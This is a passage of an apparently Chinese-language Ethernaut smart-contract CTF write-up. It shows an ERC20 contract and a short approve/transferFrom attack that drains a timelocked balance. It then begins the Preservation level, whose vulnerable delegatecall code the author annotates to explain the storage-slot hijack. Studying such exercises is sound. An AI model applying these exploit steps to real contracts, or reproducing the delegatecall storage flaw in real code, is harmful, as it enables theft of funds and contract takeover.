punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> sender<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> recipient<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> currentAllowance <span class=\"token operator\">=</span> _allowances<span class=\"token punctuation\">[</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>currentAllowance <span class=\"token operator\">!=</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>max<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>currentAllowance <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: transfer amount exceeds allowance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            unchecked <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>sender<span class=\"token punctuation\">,</span> <span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> currentAllowance <span class=\"token operator\">-</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span>sender<span class=\"token punctuation\">,</span> recipient<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">increaseAllowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> addedValue<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span><span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> _allowances<span class=\"token punctuation\">[</span><span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> addedValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">decreaseAllowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> subtractedValue<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> currentAllowance <span class=\"token operator\">=</span> _allowances<span class=\"token punctuation\">[</span><span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>currentAllowance <span class=\"token operator\">>=</span> subtractedValue<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: decreased allowance below zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        unchecked <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span><span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> currentAllowance <span class=\"token operator\">-</span> subtractedValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> sender<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> recipient<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sender <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: transfer from the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>recipient <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: transfer to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_beforeTokenTransfer</span><span class=\"token punctuation\">(</span>sender<span class=\"token punctuation\">,</span> recipient<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> senderBalance <span class=\"token operator\">=</span> _balances<span class=\"token punctuation\">[</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>senderBalance <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: transfer amount exceeds balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        unchecked <span class=\"token punctuation\">&#123;</span>\n            _balances<span class=\"token punctuation\">[</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> senderBalance <span class=\"token operator\">-</span> amount<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        _balances<span class=\"token punctuation\">[</span>recipient<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> amount<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span>sender<span class=\"token punctuation\">,</span> recipient<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_afterTokenTransfer</span><span class=\"token punctuation\">(</span>sender<span class=\"token punctuation\">,</span> recipient<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>account <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: mint to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_beforeTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> account<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        _totalSupply <span class=\"token operator\">+=</span> amount<span class=\"token punctuation\">;</span>\n        _balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> amount<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> account<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_afterTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> account<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>account <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: burn from the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_beforeTokenTransfer</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> accountBalance <span class=\"token operator\">=</span> _balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>accountBalance <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: burn amount exceeds balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        unchecked <span class=\"token punctuation\">&#123;</span>\n            _balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> accountBalance <span class=\"token operator\">-</span> amount<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        _totalSupply <span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_afterTokenTransfer</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>owner <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: approve from the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>spender <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: approve to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        _allowances<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> amount<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_beforeTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_afterTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-13\"><a href=\"#Analyze-13\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>主要是考察了erc20，之前有过一些了解</p>\n<p>学习到了solidity中super的含义，指的是调用继承合约中的函数，如下为测试合约（可供更好的理解super）&#x3D;&#x3D;<a href=\"https://blog.csdn.net/weixin_43377336/article/details/88418062\">学习链接</a>&#x3D;&#x3D;</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.5</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">C</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token builtin\">uint</span> u<span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n       u <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">B</span> <span class=\"token keyword\">is</span> C <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n       u <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">A</span> <span class=\"token keyword\">is</span> B <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// will set u to 3</span>\n       u <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">f1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// will set u to 2</span>\n       <span class=\"token comment\">//当使用super时，调用的是继承的该函数，不是它自己，比如下边给出的例子中，函数名字是相同的，要知道调用的不是它自己，是继承父合约中的同名函数。</span>\n       super<span class=\"token punctuation\">.</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">f2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// will set u to 2</span>\n       B<span class=\"token punctuation\">.</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">f3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// will set u to 1</span>\n       C<span class=\"token punctuation\">.</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Attack-13\"><a href=\"#Attack-13\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><p>看了好久发现这道题好像不能使用合约进行攻击，因为授权操作都是以msg.sender作为owner，msg.sender只能是合约（使用合约攻击的情况下）。而要使balanceOf[tx.origin]为0就只能在题目环境下解题</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">await <span class=\"token keyword\">contract</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">,</span><span class=\"token function\">toWei</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1000000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//给自己授权</span>\nawait <span class=\"token keyword\">contract</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">,</span><span class=\"token string\">'0x24fBFF0FbF51c62a64b4ED381C4E039E03dD2d6a'</span><span class=\"token punctuation\">,</span><span class=\"token function\">toWei</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1000000'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//将授权的数量转走</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h1 id=\"16-Preservation\"><a href=\"#16-Preservation\" class=\"headerlink\" title=\"16.Preservation\"></a>16.Preservation</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.The goal of this level is for you to claim ownership of the instance you are given.</p>\n<p> Things that might help</p>\n<ul>\n<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</li>\n<li>Understanding what it means for <code>delegatecall</code> to be context-preserving.</li>\n<li>Understanding how storage variables are stored and accessed.</li>\n<li>Understanding how casting works between different data types.</li>\n</ul></blockquote>\n<h2 id=\"Code-15\"><a href=\"#Code-15\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Preservation</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token comment\">// public library contracts </span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone1Library<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone2Library<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span> \n  <span class=\"token builtin\">uint</span> storedTime<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// Sets the function signature for delegatecall</span>\n  <span class=\"token builtin\">bytes4</span> <span class=\"token keyword\">constant</span> setTimeSignature <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setTime(uint256)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _timeZone1LibraryAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _timeZone2LibraryAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    timeZone1Library <span class=\"token operator\">=</span> _timeZone1LibraryAddress<span class=\"token punctuation\">;</span> \n    timeZone2Library <span class=\"token operator\">=</span> _timeZone2LibraryAddress<span class=\"token punctuation\">;</span> \n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n \n  <span class=\"token comment\">// set the time for timezone 1</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">setFirstTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _timeStamp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    timeZone1Library<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>setTimeSignature<span class=\"token punctuation\">,</span> _timeStamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//使用delegatecall调用setTime储存为storedTime，storedTime占用slot0，delegatecall进行带哦用之后执行环境为攻击合约，所以该合约之下的slot0会被修改为传入的uint数据，即timeZone1Library可控</span>\n\n  <span class=\"token comment\">// set the time for timezone 2</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">setSecondTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _timeStamp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    timeZone2Library<span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>setTimeSignature<span class=\"token punctuation\">,</span> _timeStamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// Simple library contract to set the time</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">LibraryContract</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token comment\">// stores a timestamp </span>\n  <span class=\"token builtin\">uint</span> storedTime<span class=\"token punctuation\">;</span>  \n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">setTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _time<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    storedTime <span class=\"token operator\">=</span> _time<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" 